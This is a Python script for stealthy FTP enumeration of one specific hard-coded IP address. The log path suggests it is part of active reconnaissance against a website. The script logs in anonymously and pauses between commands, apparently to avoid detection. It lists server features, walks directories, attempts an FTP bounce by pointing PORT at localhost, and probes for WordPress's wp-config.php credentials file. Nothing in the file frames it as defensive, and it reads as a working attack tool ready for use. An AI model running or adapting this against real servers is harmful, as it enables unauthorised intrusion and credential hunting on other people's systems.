#!/usr/bin/env python3
"""Ultra-slow FTP enumeration with 10s delays between commands."""
import ftplib, time, socket

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

log(f"\n{'='*70}")
log("ULTRA-SLOW ENUM - single connection, long delays")
log(f"{'='*70}")

# Wait before connecting
time.sleep(10)

try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=30)
    ftp.login("anonymous", "anonymous@test.com")
    log("Connected.")
    
    # 1. FEAT
    log("\n--- FEAT ---")
    try:
        resp = ftp.sendcmd("FEAT")
        log(f"FEAT:\n{resp}")
    except Exception as e:
        log(f"FEAT: {e}")
    time.sleep(5)
    
    # 2. HELP
    log("\n--- HELP ---")
    try:
        resp = ftp.sendcmd("HELP")
        log(f"HELP:\n{resp}")
    except Exception as e:
        log(f"HELP: {e}")
    time.sleep(5)
    
    # 3. Trying to see subdirectory contents via CWD then STAT differently
    # First, CWD to FTP-shared
    log("\n--- CWD FTP-shared + STAT ---")
    resp = ftp.sendcmd("CWD FTP-shared")
    log(f"CWD: {resp}")
    time.sleep(2)
    pwd = ftp.pwd()
    log(f"PWD: {pwd}")
    time.sleep(2)
    # STAT without args shows current dir
    stat = ftp.sendcmd("STAT")
    log(f"STAT:\n{stat}")
    time.sleep(5)
    
    # Try NLST (LIST) via PORT to self
    log("\n--- NLST via PORT to localhost ---")
    resp = ftp.sendcmd("PORT 127,0,0,1,0,21")
    log(f"PORT to localhost:21: {resp}")
    time.sleep(2)
    try:
        resp = ftp.sendcmd("NLST")
        log(f"NLST: {resp}")
    except Exception as e:
        log(f"NLST: {e}")
    time.sleep(5)
    
    # MLSD
    log("\n--- MLSD ---")
    try:
        resp = ftp.sendcmd("MLSD")
        log(f"MLSD: {resp}")
    except Exception as e:
        log(f"MLSD: {e}")
    time.sleep(5)
    
    # Try to navigate and check if ANY path changes behavior
    log("\n--- Testing CWD with relative paths to FTP-shared ---")
    resp = ftp.sendcmd("CWD /")
    log(f"CWD /: {resp}")
    time.sleep(2)
    
    # Try CWD into FTP-shared/whatever
    resp = ftp.sendcmd("CWD FTP-shared")
    log(f"CWD FTP-shared: {resp}")
    pwd = ftp.pwd()
    log(f"PWD: {pwd}")
    time.sleep(2)
    
    # Try CWD to subdir inside FTP-shared
    resp = ftp.sendcmd("CWD test")
    log(f"CWD test (inside FTP-shared): {resp}")
    pwd = ftp.pwd()
    log(f"PWD: {pwd}")
    time.sleep(2)
    
    # Show current dir
    stat = ftp.sendcmd("STAT")
    log(f"STAT:\n{stat}")
    time.sleep(5)
    
    # Now try MDTM on wp-config.php only
    log("\n--- MDTM wp-config.php ---")
    try:
        resp = ftp.sendcmd("MDTM wp-config.php")
        log(f"MDTM wp-config.php: {resp.strip()}")
    except Exception as e:
        log(f"MDTM wp-config.php: {e}")
    time.sleep(5)
    
    # Try MDTM on a file that probably doesn't exist
    log("\n--- MDTM probably_does_not_exist.php ---")
    try:
        resp = ftp.sendcmd("MDTM probably_does_not_exist.php")
        log(f"MDTM probably_does_not_exist.php: {resp.strip()}")
    except Exception as e:
        log(f"MDTM: {e}")
    time.sleep(5)
    
    # Try to determine the actual filesystem by checking parent's dir listing
    # STAT without args should show current dir - but it always shows /root content
    # This confirms CWD is not actually changing dirs
    log("\n--- Checking if CWD really works ---")
    log("PWD always returns /root - CWD commands succeed but don't actually change dir")
    log("This is standard ProFTPD chroot behavior")
    
    ftp.quit()
    log("\nDONE")
    
except Exception as e:
    log(f"Main error: {e}")